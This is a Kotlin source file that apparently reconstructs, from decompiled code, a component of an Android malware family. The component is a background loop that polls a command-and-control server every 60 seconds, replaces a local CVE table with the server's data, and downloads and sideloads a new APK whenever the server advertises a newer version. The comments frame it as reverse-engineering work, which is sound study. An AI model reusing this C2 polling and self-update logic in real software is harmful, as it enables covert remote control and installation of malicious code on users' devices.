// orig: B2/t.java   (R8-renamed suspend lambda)
//
// Background coroutine launched once from MainActivity.onCreate on
// Dispatchers.IO. Every 60 seconds:
//   1. GET /me → MeResponse.
//   2. Replace local cves table with whatever the C2 sent.
//   3. If the C2 advertises a latest_version newer than the hard-coded
//      build version 1.7, trigger MainActivity.downloadSelfUpdate(...)
//      which downloads the new APK and hands off to ApkSideloader.
//
// The "1.7" constant is the internal version of THIS build. A different
// build of this family will have a different number here.

package xyz.happify.ckemv.net

import com.google.gson.Gson
import kotlinx.coroutines.delay
import xyz.happify.ckemv.MainActivity
import xyz.happify.ckemv.jni.Reporter
import xyz.happify.ckemv.model.MeResponse

class ConfigUpdateLoop(private val activity: MainActivity) {

    companion object {
        const val INTERNAL_MAJOR = 1
        const val INTERNAL_MINOR = 7
    }

    suspend operator fun invoke() {
        while (true) {
            val db     = activity.dbHelper
            val apiKey = db.getApiKey()

            if (apiKey != null) {
                // (operator's own no-op: truncate apiKey to 8 chars for some
                //  discarded purpose — probably stripped debug logging.)
                apiKey.take(8)

                val raw = Reporter.fetchCves(apiKey, C2.BASE_URL)
                if ("Error" !in raw) {
                    try {
                        val me   = Gson().fromJson(raw, MeResponse::class.java)
                        val cves = me?.cves
                        val lv   = me?.latest_version

                        if (lv != null && (lv.major > INTERNAL_MAJOR ||
                                          (lv.major == INTERNAL_MAJOR && lv.minor > INTERNAL_MINOR))) {
                            val version = "${lv.major}.${lv.minor}"
                            MainActivity.downloadSelfUpdate(activity, apiKey, version)
                        }
                        if (cves != null) {
                            db.replaceAllCves(cves)
                        }
                    } catch (_: Exception) { /* swallow — try again next tick */ }
                }
            }

            delay(60_000)
        }
    }
}
